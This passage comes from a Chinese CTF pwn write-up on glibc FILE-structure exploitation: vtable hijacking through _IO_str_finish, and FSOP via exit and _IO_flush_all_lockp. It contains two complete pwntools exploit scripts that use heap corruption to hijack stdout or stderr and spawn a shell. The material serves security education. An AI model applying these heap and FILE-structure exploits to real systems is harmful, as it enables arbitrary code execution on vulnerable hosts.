class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./vn_pwn_easyTHeap'</span>) <span class="comment"># p = remote('node3.buuoj.cn',26233)</span></span><br><span class="line">e = ELF(<span class="string">'./vn_pwn_easyTHeap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">one_gadget = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"choice: "</span>)</span><br><span class="line">    p.sendline(str(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size?"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x260</span></span><br><span class="line">    log.info(<span class="string">'heap base leak: '</span> + str(hex(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx4, our fake chunk</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b"\x07"</span>.rjust(<span class="number">0x10</span>, <span class="string">b"\x07"</span>)) <span class="comment"># all full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b"\x7f"</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.info(<span class="string">'libc base leak: '</span> + str(hex(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake file structure</span></span><br><span class="line">    fake_file = <span class="string">b""</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFBAD2886</span>) <span class="comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">131</span>) * <span class="number">7</span> <span class="comment"># from _IO_read_ptr to _IO_buf_base</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">132</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">1</span>) <span class="comment"># _fileno for stdout is 1</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b"\x00"</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b"\n"</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0x1e20</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] - <span class="number">0xe20</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, -1</span></span><br><span class="line">    fake_file += <span class="string">b"\x00"</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b'\x00'</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>) + p64(libc_base + one_gadget) <span class="comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the _IO_2_1_stdout and its vtable</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b"\x10"</span>.rjust(<span class="number">0x10</span>, <span class="string">b"\x00"</span>) + p64(<span class="number">0</span>) * <span class="number">21</span> + p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line">    edit(<span class="number">5</span>, fake_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/28/pOolNzjyAbwJTFR.png" alt=""></p>
<blockquote>
<h4 id="IO-FILE-plus结构体中-vtable-相对偏移"><a href="#IO-FILE-plus结构体中-vtable-相对偏移" class="headerlink" title="_IO_FILE_plus结构体中 vtable 相对偏移"></a>_IO_FILE_plus结构体中 vtable 相对偏移</h4><blockquote>
<p> 在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8 </p>
<p> <a href="https://ctf-wiki.org/pwn/linux/io_file/introduction/" target="_blank" rel="noopener">ctf-wiki: FILE structure</a></p>
</blockquote>
<h4 id="vtable-合法性检测-start-from-glibc2-24"><a href="#vtable-合法性检测-start-from-glibc2-24" class="headerlink" title="vtable 合法性检测(start from glibc2.24)"></a>vtable 合法性检测(start from glibc2.24)</h4><p>自从glibc2.24版本起便增加了对于vtable的检测，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">section.  */</span></span><br><span class="line"><span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line"><span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line"><span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line"><span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment"> slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">_IO_vtable_check ();</span><br><span class="line"><span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb调试可知这个section_length的长度为3432（0xd68）：</p>
<p><img src="https://i.loli.net/2021/01/26/1P62e8KHUgOCR5i.png" alt=""></p>
<p>由此，我们所构造的fake vtable的位置受到了一定的限制，即只能在<code>__start___libc_IO_vtables</code>往后0xd68字节的范围内</p>
<h4 id="vtable表劫持姿势-under-glibc2-28"><a href="#vtable表劫持姿势-under-glibc2-28" class="headerlink" title="vtable表劫持姿势(under glibc2.28)"></a>vtable表劫持姿势(under glibc2.28)</h4><p>在glibc2.28往前的版本中<strong>_IO_str_finish函数会将_IO_2_1_stdout_ + 0xE8的位置作为一个函数指针执行</strong>，故我们通常考虑在这个位置放上我们想要执行的指令地址（如one_gadget）并将vtable表劫持到适合的位置以执行<code>_IO_str_finish()</code>函数</p>
<p>通常情况下，我们考虑<strong>劫持_IO_2_1_stdout_并修改其vtable表至表_IO_str_jumps附近</strong>，该vtable表定义于libio/sstrops.c中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">JUMP_INIT_DUMMY,</span><br><span class="line">JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">JUMP_INIT(<span class="built_in">overflow</span>, _IO_str_overflow),</span><br><span class="line">JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">JUMP_INIT(<span class="built_in">read</span>, _IO_default_read),</span><br><span class="line">JUMP_INIT(<span class="built_in">write</span>, _IO_default_write),</span><br><span class="line">JUMP_INIT(<span class="built_in">seek</span>, _IO_default_seek),</span><br><span class="line">JUMP_INIT(<span class="built_in">close</span>, _IO_default_close),</span><br><span class="line">JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>不难看出，在<strong>该表中有我们所需的_IO_str_finish函数，且该表本身便是vtable表列表中的一个表</strong>，能很好地通过vtable表合法性检测，因此我们劫持stdout时便尝将fake vtable劫持到该表附近</p>
<p>需要注意的一点是我们需要<strong>修改_IO_2_1_stdout的flag的最后一位为0以通过_IO_str_finish函数中的检测</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio/strops.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don't deallocate buffer on close. */</span></span></span><br></pre></td></tr></table></figure>

<p>64位下其会<strong>将fp + 0d8 + 0x10的位置作为函数指针进行调用</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8xEXo4kUA5Z9JMu.png" alt=""></p>
<p>需要注意的是<strong>这种利用方式仅适用于glibc2.28以下的版本，自glibc2.28始该段代码被修改，无法再通过同种方式进行利用</strong></p>
<p>自glibc2.28始，该函数<strong>不会调用额外的函数指针</strong>，而是会<code>直接使用free()</code>，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类似地，<strong>对于_IO_str_overflow的利用自glibc2.28始同样失效</strong>，源码比较长就不在这里贴出了</p>
<p>参考：<a href="https://ctf-wiki.org/pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-finish" target="_blank" rel="noopener">ctf-wiki: exploit in libc2.24</a></p>
</blockquote>
<h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h4><h5 id="例题：ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><a href="#例题：ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP" class="headerlink" title="例题：ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP"></a>例题：ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</h5><p>惯例的<code>checksec</code>，保  护  全  开（噔  噔  咚</p>
<p><img src="https://i.loli.net/2021/01/28/eBdwI7PSxn3ypCO.png" alt=""></p>
<p>拖入IDA进行分析，可知该程序有着分配、编辑、打印堆块的功能</p>
<p>但是我们<strong>仅能够分配一个堆块，且无法释放堆块</strong></p>
<p><img src="https://i.loli.net/2021/01/28/9aomlHGesxkAqrF.png" alt=""></p>
<p>漏洞点在于创建/编辑堆块时输入作者姓名时<strong>存在溢出，可以覆写掉与其相邻的堆块指针</strong>，在接下来的编辑中我们便可以<strong>实现任意地址写</strong></p>
<p><img src="https://i.loli.net/2021/01/28/Lq7cFMxUl6ytRiG.png" alt=""></p>
<p><img src="https://i.loli.net/2021/01/28/HnhJeRX21OWp5Mq.png" alt=""></p>
<p>同时，<strong>输入666则可直接泄露libc地址</strong></p>
<p><img src="https://i.loli.net/2021/01/28/D3g5PRshQfFxVy6.png" alt=""></p>
<p><img src="https://i.loli.net/2021/01/28/hUdkKbNwqr2WZap.png" alt=""></p>
<p>由于glibc2.23中未加入对vtable表的合法性检测，故我们可以考虑直接劫持<code>_IO_2_1_stderr_</code>及其vtable表执行<code>system(&quot;/bin/sh&quot;)</code>以get shell（stderr为FILE链表的头结点），其中由于<code>__overflow()</code>函数会将指向FILE的指针作为其第一个参数，故考虑将”/bin/sh”字符串构造于fake file的开头</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_n_7'</span>)<span class="comment">#remote('node3.buuoj.cn', 26348)</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.31.so'</span>)<span class="comment">#ELF('./libc-2.23.so')</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b'666'</span>)</span><br><span class="line">puts_addr = int((p.recvuntil(<span class="string">b'\n'</span>, drop = <span class="literal">True</span>)), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">'libc leak: '</span> + str(hex(libc_base)))</span><br><span class="line">p.recvuntil(<span class="string">b"Your choice-&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"Input string Length: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b"Author name:"</span>)</span><br><span class="line">p.send(<span class="string">b'arttnba3'</span> + p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]))</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b""</span></span><br><span class="line">fake_file += <span class="string">b"/bin/sh\x00"</span> <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">'system'</span>])<span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b"\x00"</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b"\n"</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0x1ea0</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] - <span class="number">0x160</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b"\x00"</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b'\x00'</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] + <span class="number">0x10</span>) <span class="comment"># fake vtable</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"Your choice-&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"New Author name:"</span>)</span><br><span class="line">p.send(<span class="string">b'arttnba3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"New contents:"</span>)</span><br><span class="line">p.send(fake_file)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/31/HItF2WqQlb6kyTZ.png" alt=""></p>
<blockquote>
<h4 id="exit-函数与FSOP相关…"><a href="#exit-函数与FSOP相关…" class="headerlink" title="exit()函数与FSOP相关…"></a>exit()函数与FSOP相关…</h4><blockquote>
<p> 由于程序退出时必定会调用<code>exit()</code>函数，故我们要对这个函数多多上心2333</p>
</blockquote>
<p>我们不难观察到在<code>exit()</code>函数当中还会调用<code>_IO_flush_all_lockp ()</code>函数</p>
<p><img src="https://i.loli.net/2021/01/30/x3I8sHJpvRqmajM.png" alt=""></p>
<p>该函数会刷新_IO_list_all链表中所有项的文件流 ，定义于libio/genops.c中，我们主要关注其中的如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>中间的那一段宏一般为假，我们暂且先不管</p>
</blockquote>
<p>那么其会检查如下两个条件：</p>
<ul>
<li><strong>fp-&gt;_mode &lt;= 0</strong></li>
<li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li>
</ul>
<p>按照程序执行流程，在这两个条件通过之后便会使用宏<code>_IO_OVERFLOW()</code>，其定义于libio/libioP.h中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>

<p>由此可知其<strong>最终会调用vtable表中的</strong><code>__overflow</code><strong>函数，且第一个参数为指向FILE自身的指针</strong></p>
</blockquote>
<h2 id="0x04-更加高级的攻击手法"><a href="#0x04-更加高级的攻击手法" class="headerlink" title="0x04.更加高级的攻击手法"></a>0x04.更加高级的攻击手法</h2><blockquote>
<p>下面的中文译名都是瞎取的233333</p>
</blockquote>
